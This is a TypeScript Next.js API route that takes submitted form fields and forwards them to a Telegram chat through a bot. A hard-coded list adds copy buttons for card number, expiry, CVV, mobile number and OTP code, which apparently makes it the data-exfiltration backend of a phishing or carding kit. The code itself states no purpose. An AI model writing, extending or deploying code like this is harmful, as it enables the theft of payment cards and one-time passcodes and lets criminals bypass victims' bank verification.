import { NextResponse } from 'next/server'

type Field = { label: string; value: string }

// Escape the small set of characters that break Telegram HTML parse mode.
function escapeHtml(value: string) {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

// Fields sensitive/short enough to be worth a one-tap "copy to clipboard"
// button under the Telegram message (Bot API 7.5+ inline keyboard buttons).
const COPYABLE_LABELS = ['Card Number', 'Expiry', 'CVV', 'Mobile', 'OTP Code']

// Group buttons two-per-row, matching the reference layout (Card Number +
// Expiry on one row, CVV + Mobile on the next, etc).
function buildCopyKeyboard(fields: Field[]) {
  const buttons = fields
    .filter((f) => COPYABLE_LABELS.some((label) => label.toLowerCase() === f.label.toLowerCase()))
    .map((f) => ({
      text: `Copy ${f.label}`,
      copy_text: { text: f.value },
    }))

  if (buttons.length === 0) return undefined

  const rows: Array<Array<(typeof buttons)[number]>> = []
  for (let i = 0; i < buttons.length; i += 2) {
    rows.push(buttons.slice(i, i + 2))
  }
  return { inline_keyboard: rows }
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const title = typeof body?.title === 'string' ? body.title.trim() : ''

    const rawFields = Array.isArray(body?.fields) ? body.fields : []
    const fields: Field[] = rawFields
      .map((field: unknown) => {
        const f = field as Partial<Field>
        return {
          label: typeof f?.label === 'string' ? f.label.trim().slice(0, 60) : '',
          value: typeof f?.value === 'string' ? f.value.trim().slice(0, 200) : '',
        }
      })
      .filter((field: Field) => field.label && field.value)

    if (!title || title.length > 120 || fields.length === 0) {
      return NextResponse.json({ error: 'Invalid payload' }, { status: 400 })
    }

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      return NextResponse.json({ error: 'Telegram is not configured' }, { status: 503 })
    }

    const lines = fields
      .map((f) => `<b>${escapeHtml(f.label)}:</b> ${escapeHtml(f.value)}`)
      .join('\n')
    const text = `<b>${escapeHtml(title)}</b>\n${lines}`
    const reply_markup = buildCopyKeyboard(fields)

    const telegramPayload = {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      ...(reply_markup ? { reply_markup } : {}),
    }

    let telegramResponse: Response | undefined
    let lastDescription = 'Telegram notification failed'

    // Telegram can briefly return gateway errors. Retry only failed requests;
    // the same message is safe to retry because this endpoint sends one payload.
    for (let attempt = 0; attempt < 3; attempt += 1) {
      try {
        telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify(telegramPayload),
          cache: 'no-store',
          signal: AbortSignal.timeout(10_000),
        })

        if (telegramResponse.ok) break

        const errorBody = await telegramResponse.json().catch(() => null)
        lastDescription = typeof errorBody?.description === 'string'
          ? errorBody.description
          : `Telegram returned HTTP ${telegramResponse.status}`
      } catch {
        lastDescription = 'Telegram request timed out or could not connect'
      }

      if (attempt < 2) await new Promise((resolve) => setTimeout(resolve, 400 * (attempt + 1)))
    }

    if (!telegramResponse?.ok) {
      console.error('[v0] Telegram notification failed:', lastDescription)
      return NextResponse.json({ error: lastDescription }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Invalid request' }, { status: 400 })
  }
}
